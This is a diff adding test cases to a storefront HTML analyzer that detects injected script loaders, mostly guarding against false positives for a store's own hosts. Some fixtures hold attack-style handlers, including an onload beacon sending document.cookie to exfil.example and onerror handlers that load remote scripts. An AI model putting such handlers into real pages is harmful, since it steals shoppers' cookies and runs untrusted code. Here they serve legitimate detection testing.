@@ -157,6 +157,71 @@ describe("analyzeStorefrontHtml: false-positive guards", () => {
   });
 });
 
+describe("analyzeStorefrontHtml: the store's own hosts (audit fix)", () => {
+  const ctx = { shopHosts: ["mystore.com", "mystore.myshopify.com"] };
+
+  it("a theme script served from the store's own domain inside the menu is not a loader", () => {
+    const out = analyzeStorefrontHtml(
+      page(`<nav><script src="//mystore.com/cdn/shop/t/1/assets/menu.js"></script></nav>`),
+      ctx,
+    );
+    expect(out.loaders).toEqual([]);
+  });
+
+  it("an image fallback to the store's own domain is not a loader", () => {
+    const out = analyzeStorefrontHtml(
+      page(`<img src="/a.png" onerror="this.src='//mystore.com/cdn/shop/files/fallback.png'">`),
+      ctx,
+    );
+    expect(out.loaders).toEqual([]);
+  });
+
+  it("an image fallback to any other host is not a loader either (no script, no network call)", () => {
+    const out = analyzeStorefrontHtml(
+      page(
+        `<img src="/a.png" onerror="this.onerror=null;this.src='https://placehold.co/600x400'">`,
+      ),
+    );
+    expect(out.loaders).toEqual([]);
+  });
+
+  it("a handler that points at an external .js file is still a loader", () => {
+    const out = analyzeStorefrontHtml(
+      page(`<img src=x onerror="s.src='https://loader.example/l3.js?v=1'">`),
+    );
+    expect(out.loaders.map((l) => [l.reason, l.host])).toEqual([
+      ["external_url", "loader.example"],
+    ]);
+  });
+
+  it("a handler that beacons to an external host is a loader", () => {
+    const out = analyzeStorefrontHtml(
+      page(`<img src=x onload="navigator.sendBeacon('https://exfil.example/c', document.cookie)">`),
+    );
+    expect(out.loaders[0]).toMatchObject({ reason: "external_url", host: "exfil.example" });
+  });
+
+  it("code construction on the store's own host is still a loader, keyed by its reason", () => {
+    const out = analyzeStorefrontHtml(
+      page(
+        `<img src=x onerror="var s=document.createElement('script');s.src='//mystore.com/x.js';document.head.appendChild(s)">`,
+      ),
+      ctx,
+    );
+    expect(out.loaders.map((l) => [l.fingerprint, l.host])).toEqual([
+      ["SCRIPT_LOADER:creates_script", null],
+    ]);
+  });
+
+  it("theme-scan hosts are trusted for menu scripts too", () => {
+    const out = analyzeStorefrontHtml(
+      page(`<nav><script src="https://menu.vendor.io/m.js"></script></nav>`),
+      { knownThemeHosts: new Set(["menu.vendor.io"]) },
+    );
+    expect(out.loaders).toEqual([]);
+  });
+});
+
 describe("analyzeStorefrontHtml: signals", () => {
   it("the 17TRACK menu-label loader on a listed domain is KNOWN_MALICIOUS only (no duplicate loader)", () => {
     const out = analyzeStorefrontHtml(
